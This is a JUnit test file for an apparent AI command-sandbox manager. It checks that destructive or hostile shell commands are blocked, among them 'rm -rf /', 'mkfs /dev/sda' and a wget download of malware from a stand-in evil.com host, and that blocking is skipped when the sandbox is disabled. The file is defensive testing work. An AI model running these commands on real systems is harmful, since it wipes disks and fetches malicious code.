package org.wall.im.ai.sandbox;

import org.junit.jupiter.api.DisplayName;
import org.junit.jupiter.api.Nested;
import org.junit.jupiter.api.Test;
import org.wall.im.ai.core.model.SandboxConfig;
import org.wall.im.ai.core.sandbox.Sandbox;
import org.wall.im.ai.core.sandbox.SandboxResult;

import java.util.List;

import static org.junit.jupiter.api.Assertions.*;
import static org.mockito.Mockito.*;

/**
 * SandboxManager单元测试
 */
@DisplayName("SandboxManager测试")
class SandboxManagerTest {

    @Nested
    @DisplayName("危险操作检测测试")
    class DangerousOperationTest {

        @Test
        @DisplayName("包含rm -rf / 应被拦截")
        void rmRfRoot_shouldBeBlocked() {
            SandboxConfig config = createEnabledConfig();
            Sandbox sandbox = mock(Sandbox.class);
            SandboxManager manager = new SandboxManager(sandbox, config);

            SandboxResult result = manager.safeExecute("rm -rf /");

            assertFalse(result.isSuccess());
            assertTrue(result.getErrorOutput().contains("Dangerous"));
            verifyNoInteractions(sandbox);
        }

        @Test
        @DisplayName("包含wget应被拦截")
        void wget_shouldBeBlocked() {
            SandboxConfig config = createEnabledConfig();
            Sandbox sandbox = mock(Sandbox.class);
            SandboxManager manager = new SandboxManager(sandbox, config);

            SandboxResult result = manager.safeExecute("wget http://evil.com/malware");

            assertFalse(result.isSuccess());
            verifyNoInteractions(sandbox);
        }

        @Test
        @DisplayName("包含mkfs应被拦截")
        void mkfs_shouldBeBlocked() {
            SandboxConfig config = createEnabledConfig();
            Sandbox sandbox = mock(Sandbox.class);
            SandboxManager manager = new SandboxManager(sandbox, config);

            SandboxResult result = manager.safeExecuteCommand("mkfs /dev/sda");

            assertFalse(result.isSuccess());
            verifyNoInteractions(sandbox);
        }

        @Test
        @DisplayName("安全命令应正常执行")
        void safeCommand_shouldExecute() {
            SandboxConfig config = createEnabledConfig();
            Sandbox sandbox = mock(Sandbox.class);
            when(sandbox.execute(anyString(), anyString()))
                    .thenReturn(SandboxResult.success("ok", 10));
            SandboxManager manager = new SandboxManager(sandbox, config);

            SandboxResult result = manager.safeExecute("echo hello");

            assertTrue(result.isSuccess());
            verify(sandbox).execute("echo hello", config.getWorkDir());
        }
    }

    @Nested
    @DisplayName("沙盒禁用测试")
    class SandboxDisabledTest {

        @Test
        @DisplayName("沙盒禁用时应直接执行不检查危险操作")
        void disabled_shouldExecuteWithoutCheck() {
            SandboxConfig config = new SandboxConfig();
            config.setEnabled(false);
            Sandbox sandbox = mock(Sandbox.class);
            when(sandbox.execute(anyString(), isNull()))
                    .thenReturn(SandboxResult.success("done", 5));

            SandboxManager manager = new SandboxManager(sandbox, config);
            SandboxResult result = manager.safeExecute("rm -rf /");

            assertTrue(result.isSuccess());
            verify(sandbox).execute("rm -rf /", null);
        }
    }

    @Nested
    @DisplayName("路径访问检查测试")
    class PathAccessTest {

        @Test
        @DisplayName("canAccess应委托给sandbox.isPathAllowed")
        void canAccess_shouldDelegateToSandbox() {
            SandboxConfig config = createEnabledConfig();
            Sandbox sandbox = mock(Sandbox.class);
            when(sandbox.isPathAllowed("/safe/path")).thenReturn(true);
            when(sandbox.isPathAllowed("/dangerous/path")).thenReturn(false);

            SandboxManager manager = new SandboxManager(sandbox, config);

            assertTrue(manager.canAccess("/safe/path"));
            assertFalse(manager.canAccess("/dangerous/path"));
        }
    }

    private SandboxConfig createEnabledConfig() {
        SandboxConfig config = new SandboxConfig();
        config.setEnabled(true);
        config.setWorkDir("/tmp/sandbox");
        return config;
    }
}
